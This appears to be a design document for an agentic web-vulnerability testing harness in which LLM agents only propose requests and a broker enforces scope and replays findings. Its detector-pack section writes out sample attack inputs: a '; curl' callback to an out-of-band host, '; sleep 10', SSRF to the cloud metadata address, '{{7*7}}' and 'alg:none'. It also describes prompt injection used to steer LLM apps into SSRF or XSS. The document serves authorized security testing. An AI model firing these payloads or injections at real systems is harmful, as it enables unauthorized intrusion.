# Security Harness

> An open, **local-first** agentic harness that hunts **all major web
> vulnerability classes** — via pluggable **detector packs** — on *authorized*
> targets, where **agents only propose actions, a scope-enforcing broker executes
> them, and a deterministic grounding layer re-runs every claim before it can
> become a finding.** Nothing hallucinated survives.

---

## 1. Problem

Agentic vulnerability tools today split into two camps, and both fall short:

- **Source-audit research frameworks** — rigorous evidence discipline, but
  **source-only**; they never touch a running target.
- **Live bug-bounty bots** — hit real web targets, but let an LLM fire requests
  and **trust its own summary**. They have no proof a finding is real.

The dominant failure mode across the field: **agents hallucinate.** They "confirm"
their own bugs, narrate tool output they never actually ran, and build on
fabricated results. The output is noise a human must re-verify by hand — which
defeats the point. By 2026 this noise became a crisis: bug-bounty triage volume
spiked (one platform reported a ~388% jump) and several programs paused payouts
over AI-generated junk. **A harness that only emits *reproduced* findings is the
direct antidote** — that is this project's reason to exist.

Three things are almost always missing at once:
1. **Grounding** — no guarantee a reported bug was actually reproduced.
2. **Hard scope/credential safety** — enforced by prompts, not by code.
3. **Honest coverage** — activity (requests sent) is mistaken for coverage.

---

## 2. Solution

Bring source-audit-grade evidence discipline to *live* web testing, with one
structural guarantee: **a finding cannot exist unless the harness reproduced it.**

**One-line identity:**
*The open, local, web-vulnerability harness where the AI structurally cannot report
a bug it didn't actually reproduce.*

**How:** split the system into a **dumb, trusted coordinator** + **replaceable
intelligent workers** + **deterministic correctness gates**. The LLM reasons and
proposes; it never decides what is real and never touches the network directly.

**Design goals:**
- **Provably-grounded findings** — every confirmed result is replayed against the
  target through a logged broker; a claim with no matching exchange is rejected.
- **Safe by construction** — scope and credentials enforced in code, not prompts.
- **Open & local-first** — self-hostable, provider-agnostic LLM (Claude / GPT /
  local Ollama); target data and credentials never leave the machine.
- **Extensible** — all major web bug classes via pluggable detector packs (§11).

---

## 3. Tech Architecture

Six layers. Only the broker touches the network; only the orchestrator writes
state; only the agents use an LLM.

```
┌─────────────────────────────────────────────────────────┐
│ ORCHESTRATOR (parent) — SQLite state, scope contract,     │
│   credentials-by-ref, budget, scheduling, dedup. NO LLM.  │
└───────────────┬───────────────────────────┬──────────────┘
                │ proposes                   │ reads/writes
        ┌───────▼────────┐          ┌────────▼─────────┐
        │  AGENTS         │          │  STATE STORE      │
        │ (propose only)  │          │ SQLite: findings/ │
        │ LLM-powered     │          │ obs / fingerprints │
        └───────┬────────┘          └──────────────────┘
                │ request plan (never raw calls)
        ┌───────▼───────────────────────────────┐
        │  REQUEST BROKER  (ONLY network egress)  │
        │  scope allowlist · cred injection ·     │
        │  rate limit · grounding ledger          │
        └───────┬─────────────────────────────────┘
                │ recorded exchanges
        ┌───────▼────────┐   ┌──────────────────┐
        │ GROUNDING       │   │ EVIDENCE GATE     │
        │ VERIFIER        │──▶│ deterministic:    │
        │ (re-runs plan)  │   │ schema + diff +   │
        └────────────────┘   │ negative control  │
                             └──────────────────┘
```

**Two separate network paths — never conflate them:**
1. **Agent ↔ LLM** — reasoning, plans, *redacted* evidence only. Disappears
   entirely with a local model.
2. **Broker ↔ target** — the real attack traffic. **Never** passes through the LLM
   provider. Target data and credentials stay local.

**The broker is the keystone:** one choke point that makes scope enforcement,
grounding, and credential-safety all true *by construction* rather than by trust.

**Stack:** Python · SQLite (state) · deterministic validators (Python/Node) ·
provider-agnostic LLM layer · broker over a native HTTP client or a wrapped
proxy (Burp/Caido).

---

## 4. The Constitution (the rules — enforced in **code**, not prompts)

### 4.1 Safety — scope lives in the broker, never the agent
- Every outbound request passes a **scope allowlist** (origin + path + method);
  out-of-scope = hard block, logged, no retry.
- **Owned/disposable accounts only.** Two identities minimum (attacker + victim),
  disposable test data.
- **Hard-prohibited, un-overridable by any agent:** DoS/flooding, credential
  brute-force, CAPTCHA/bot-bypass, out-of-band callbacks (unless explicitly
  approved), scanning/host discovery.
- **Auto-stop conditions:** bot challenge, auth ambiguity, a 200 that is really a
  challenge page, rate-limit signal, unexpected destructive effect.
- **Credentials never enter agent context** — injected by reference at the broker.

### 4.2 Evidence — no finding without a replayed differential
A candidate becomes `confirmed` only with **all** of:
1. a legitimate **baseline** (identity performs the action on its own resource → works),
2. an **enforcing negative control** (what *should* block the attack),
3. the **attack case** differing from the control in exactly one variable,
4. a **prohibited effect** verified by authoritative readback,
5. **cleanup** of any state change,
6. a **fresh reproduction** (new tokens/identity, replayed independently).

Anything short = `needs_validation` (**no severity**). Severity only on `confirmed`.

### 4.3 Grounding — agents propose, broker observes, verifier re-runs
- Agents emit a **request plan**, never raw network calls.
- The broker logs every exact request/response → the **grounding ledger**.
- Before acceptance, the **grounding verifier** re-executes the recorded sequence
  and diffs observed effect vs. the agent's claim.
- **A claim with no matching ledger line is auto-rejected.** This is the
  anti-hallucination spine.

---

## 5. Agents

### 5.1 Roles — 4 (3 LLM + 1 scripted)

| # | Role | Model tier | Authority | Job |
|---|---|---|---|---|
| 1 | **Surface Mapper** (recon) | cheap/fast | read-only | Crawl authorized scope → object + identity + action graph |
| 2 | **Hunter** (oracle-pluggable) | strong | propose-only | Load the active **detector pack(s)** and generate test plans per coverage cell. Pack supplies the oracle; the Hunter is class-agnostic |
| 3 | **Validator** | strong, *separate context/model* | propose-only, **cannot file** | Independently re-derive the test; insist on the negative control; confirm the differential |
| 4 | **Reporter** | **none (deterministic)** | — | Render the report from `confirmed` records only |

**Hunter ≠ Validator** (different identity, ideally different model) — adversarial
review, no self-grading.

### 5.2 Instances (runtime fan-out)
The **Hunter fans out**: one short-lived instance per coverage cell. A 20-endpoint
target may spawn 20–50 hunter *instances* per run, each narrow, under a per-run
cap. Roles stay at 4; instances scale with the target, bounded by budget.

*(Growth later, only when a gap hurts: chain-builder, dedup agent, report-plus.)*

---

## 6. Orchestrator (the kernel)

> The single-writer coordinator that owns all shared state, hands out work, holds
> credentials and scope, enforces the budget, and decides when a run is done —
> **and never calls an LLM.** The AI proposes; the orchestrator disposes.

### 6.1 Its 7 jobs
1. **Own the contract** — signed scope (origins, paths, methods, identities,
   limits, stop conditions). Immutable for the run.
2. **Own state** — SQLite is the source of truth, not any agent's context.
3. **Schedule work** — pull `planned` units, spawn hunters, collect, spawn
   validators for survivors. Bounded fan-out.
4. **Hold secrets** — creds live here, injected into the broker by reference.
5. **Enforce budget** — reserve validation calls before hunting.
6. **Dedup** — one root cause = one fingerprint across waves/runs.
7. **Own the terminal decision** — `complete` or `incomplete` (+ exact reason);
   never silently stops mid-phase.

### 6.2 Invariants it enforces
- **Single writer** — only the orchestrator writes shared tables.
- **Scope immutable mid-run** — a contract change = a new run.
- **No finding without a ledger match** — a candidate whose requests aren't in
  `ledger` is auto-`rejected` (enforced by a JOIN).
- **Hunter ≠ Validator** — refuses to assign validation to the hunting identity.
- **Budget reserves are sacred** — hunters can't consume validation reserves.
- **Leases, not trust** — long work heartbeats; a lapsed lease is recovered, never
  assumed done.

### 6.3 What it is NOT
Not an agent (no prompt, no LLM). Not the network (only the broker sends). Not a
scanner (it schedules + records).

---

## 7. Request Broker (the keystone)

The only component with network egress. For every agent-proposed request plan it:

1. **Validates scope** — origin/path/method against the immutable contract; blocks
   and logs anything out of bounds.
2. **Injects credentials by reference** — the agent passed an identity *handle*,
   never a token; the broker attaches the real secret here.
3. **Rate-limits & applies stop conditions** — backs off, halts on bot/challenge
   or destructive signals.
4. **Records the exchange** — exact request + response, hashed, into the
   **grounding ledger**.

Because every target interaction is funneled here, scope, secret-safety, and
grounding are structural guarantees, not behaviors we hope the model follows.

---

## 8. Grounding Verifier & Evidence Gate

**Grounding Verifier (deterministic):** takes a candidate's claimed request
sequence, **re-executes it through the broker** with fresh state, and diffs the
observed effect against the agent's claim. If the ledger has no matching
exchanges, or the differential doesn't reproduce, the candidate is dropped. This
is what makes a hallucinated finding impossible.

**Evidence Gate (deterministic):** a non-LLM checker that enforces §4.2 —
schema-validates the record, verifies the baseline/control/attack differential,
confirms cleanup, and ensures severity ≤ demonstrated impact. Pass = eligible for
the Validator; fail = `needs_validation` or `rejected`.

Neither contains a model. **The thing that decides what's real is deterministic.**

---

## 9. State Model (SQLite — source of truth)

```sql
runs(run_id, target, contract_hash, profile, budget, status, reason, started_at)
-- status: in_progress | complete | incomplete

identities(id, run_id, role, label, cred_ref)   -- cred_ref, never the token
objects(id, run_id, resource_type, owner_identity, endpoint, method)  -- recon graph
coverage_units(id, run_id, object_id, action, identity, state, owner_agent, wave)
-- state: planned | in_progress | covered | candidate | blocked | deferred

candidates(fingerprint, run_id, unit_id, title, trace, proposed_verdict, status)
-- status: proposed | grounded | validated | confirmed | needs_validation | rejected

ledger(id, run_id, request_hash, method, url, status_code, resp_digest, identity, ts)
-- the GROUNDING LEDGER: every broker exchange, hashed. anti-hallucination spine.

findings(fingerprint, run_id, verdict, severity, evidence_refs, cleanup_done)
leases(unit_id, agent_id, expires_at)            -- dead-worker recovery
```

Two load-bearing tables: **`coverage_units`** (proves completeness, not just
activity) and **`ledger`** (proves findings aren't fabricated).

---

## 10. Run Loop

```
1. Load + verify contract → write runs row (in_progress)
2. Spawn Surface Mapper → ingest object/identity graph → seed coverage_units 'planned'
3. BUDGET GATE: reserve validator calls. Can't fund minimum → incomplete.
4. WHILE planned units remain and budget allows:
     a. claim a batch of planned units (set lease + owner)
     b. spawn Hunter instances → return request PLANS
     c. broker executes plans under scope → writes to ledger
     d. grounding verifier re-runs → candidates 'grounded' or dropped
     e. evidence gate (schema + differential + negative control) → pass/fail
     f. consolidate by fingerprint, update units, recover expired leases
5. For each surviving candidate: spawn fresh Validator (different identity)
     → confirmed | needs_validation | rejected
6. Spawn Reporter (deterministic) → write report from confirmed + needs_validation
7. Set runs.status = complete (or incomplete + reason). Done.
```

Crash at 4c? Reload from SQLite, re-claim unleased units, continue. **One task
lost, not the run.**

---

## 11. Detector Packs (how "all major bugs" stays tractable)

The whole machine is **bug-class-agnostic**. The **only** class-specific piece is
the **oracle** — the per-class template for *baseline → enforcing negative control
→ attack → proof*. So we build **one platform and many detector packs**; adding a
class = writing a pack, not touching the core.

### 11.1 What a pack provides
```
pack = {
  class_id,            # "idor-bola", "ssrf", "ssti", ...
  surface_filter,      # which coverage cells this pack claims
  plan_generator,      # cell → list[request plan] (the probes)
  negative_control,    # what MUST hold for the control to enforce
  evidence_criteria,   # what observed differential = confirmed
  cleanup,             # how to undo any state change
  severity_hint        # demonstrated effect → severity band
  terminal_class       # optional: rolls a confirmed result up to RCE, etc.
}
```
The Hunter loads packs; the broker executes their plans; the **same** grounding
verifier + evidence gate judge the result. Every pack implements the same shape:
**baseline → enforcing negative control → attack → ground (replay) → cleanup.**

### 11.2 Two reference oracles

**IDOR / BOLA (built first — exercises every layer):**
```
Baseline : identity A → GET /api/orders/{A_id}   ⇒ 200 + A's data        (expected)
Control  : identity B → GET /api/orders/{B_id}   ⇒ 200 + B's data        (expected)
Attack   : identity B → GET /api/orders/{A_id}   ⇒ should be 403/404
                                                   if 200 + A's data ⇒ FINDING
Ground   : re-run all three w/ fresh tokens; confirm differential; cleanup
```

**Command injection (shows the deterministic *blind* oracle — no browser/OOB needed):**
```
Baseline : benign input                      ⇒ normal response, fast (~200ms)
Control  : payload that SHOULD be sanitized  ⇒ blocked
Attack   : inject  ; sleep 10   (blind timing)   OR   ; curl http://owned-oob/<nonce>
Ground   : re-run N times — timing differential holds (5/5 ≈ 10s), or OOB beacon
           arrives → command execution PROVEN → stop + cleanup   (terminal: RCE)
```

### 11.3 Pack registry (full — built in waves by mechanizability × payout)

| Wave | Pack | Class | Oracle (attack → ground signal) | Terminal |
|---|---|---|---|---|
| 1 | `idor-bola` | Access ctrl — object (BOLA) | B reads A's object → response differential | — |
| 1 | `bfla` | Access ctrl — function | low role calls high-role fn → effect via readback | — |
| 1 | `tenant-isolation` | Multi-tenant leakage | attacker tenant touches victim tenant → diff | — |
| 2 | `ssrf` | SSRF | param → owned OOB / `169.254.169.254` → OOB beacon | — |
| 2 | `sqli` / `nosqli` | Injection | boolean / time / error differential vs control | — |
| 2 | `cmd-inj` | OS command injection | `;sleep 10` timing (preferred) or OOB nonce | **RCE** |
| 2 | `ssti` | Template injection | `{{7*7}}`→`49` evaluated server-side | **RCE** |
| 3 | `xss` | Reflected / Stored / DOM | marker → **headless browser confirms JS executed** | — |
| 3 | `csrf` | CSRF | cross-site state-change w/o token → readback (+SameSite check) | — |
| 3 | `auth-jwt` | Auth / session | forged / `alg:none` / expired token accepted → bug | — |
| 3 | `oauth-flows` | OAuth / OpenID | bad `redirect_uri`/`state`, `request_uri` SSRF, token leak → ATO | — |
| 3 | `cors` | CORS misconfig | attacker-origin credentialed read allowed → bug | — |
| 3 | `open-redirect` | Open redirect | attacker URL honored at redirect sink | — |
| 3 | `web-cache-deception` | Cache deception | `/account;.js` cached → attacker refetches victim data | — |
| 3 | `graphql-authz` | GraphQL authz | access-control oracle over resolvers / mutations / batching | — |
| 4 | `business-logic` | Logic flaws | price / qty / workflow step-skip → readback vs invariant | — |
| 4 | `race-condition` | TOCTOU / limits | paired-concurrency double-spend → N/M reliability | — |
| 4 | `idor-write` | Write-IDOR | cross-identity mutation + authoritative readback | — |
| 5 | `deserialization` | Insecure deserial. | structure-aware probe → owned effect (no eval in-harness) | **RCE** |
| 5 | `xxe` | XXE | external-entity resolution proof | — |
| 5 | `upload-traversal` | Upload / traversal / LFI | out-of-bounds write or read proof | — |
| 5 | `req-smuggling` | HTTP desync | **owner-approved** isolated topology, fixed conn/byte limits | — |
| 5 | `llm-app-injection` | LLM-app (novel) | inject via LLM-reachable input → reaches a classic groundable sink | *sink's* |

Waves 1–3 are the bounty bread-and-butter. Wave 4 is where grounding +
paired-concurrency earn their keep (human testers still win here). Wave 5 is
advanced / explicitly gated by §4.1.

**`llm-app-injection` (the differentiator):** don't test the jailbreak — test
prompt-injection *as a bridge to a classic, groundable bug*. Inject via a chat
box, retrieved document, or tool parameter and detect when it reaches **SSRF**
(model fetches attacker URL → owned OOB), **XSS** (insecure output handling →
marker executes in a browser), or **SQLi** (via a tool call). The final proof is a
normal deterministic differential, so it still passes the grounding gate — it
rides the +540% prompt-injection trend without betting on flaky "did it jailbreak"
checks.

### 11.4 RCE — the gated terminal class

RCE is not a flat pack; it is a **terminal reached via chains** — fed by `cmd-inj`,
`ssti`, `deserialization`, and `upload-traversal`. Highest value, highest risk, so
it carries extra rules from §4.1:

- **Proof is one harmless marker** — a unique OOB beacon, a `sleep`/`id`-style
  signal, or a sentinel file in a scratch dir. **Never** a reverse shell,
  destructive command, persistence, or data exfiltration.
- **Prefer the no-egress proof** (timing) over an OOB callback where possible; any
  OOB must be contract-listed.
- **Stop the instant execution is proven.** No post-exploitation.
- Built only *after* its feeder injection packs exist.

### 11.5 OWASP Top 10 (2021) coverage & scope boundary

Security Harness is a **runtime black-box differential tester** — it proves bugs by
sending a request and observing a differential. It is **not** an SCA, SAST,
config-audit, or log-monitoring tool. Coverage maps as follows:

| OWASP | Coverage | Packs / note |
|---|---|---|
| A01 Broken Access Control | ✅ core | `idor-bola`, `bfla`, `tenant-isolation`, `idor-write` |
| A02 Cryptographic Failures | ⚠️ runtime signals only | `auth-jwt` (`alg:none`), secrets-in-URL / plain-HTTP flags; deep review is source/config |
| A03 Injection | ✅ strong | `sqli`/`nosqli`, `cmd-inj`, `ssti`, `xss` → `rce` |
| A04 Insecure Design | ⚠️ partial | `business-logic`, `race-condition`; rest is methodology, not runtime-testable |
| A05 Security Misconfiguration | ⚠️ partial | `cors`, header/cookie checks, exposed debug endpoints |
| A06 Vulnerable & Outdated Components | ❌ out | SCA — different tool; optional reporting-only side-check later |
| A07 Identification & Auth Failures | ✅ good | `auth-jwt`, `oauth-flows`, session/MFA logic |
| A08 Software & Data Integrity Failures | ❌ mostly out | only the `deserialization` slice; supply-chain/build integrity is out |
| A09 Logging & Monitoring Failures | ❌ out | not externally observable in a black-box model |
| A10 SSRF | ✅ yes | `ssrf` |

> **Scope boundary (state it plainly):** Security Harness targets the
> **runtime-exploitable** OWASP categories (A01, A03, A07, A10, parts of
> A02/A04/A05, and the deserialization slice of A08). A06, A09, and supply-chain
> integrity are **explicitly out of scope** — a runtime harness has no authority
> there, and pretending otherwise costs credibility.

> **Honest coverage rule:** ship Wave-1 `idor-bola` end-to-end first (it exercises
> every layer). Each later pack is one module against the unchanged core — but a
> class is only *claimed* once its pack has produced a real, reproduced finding.
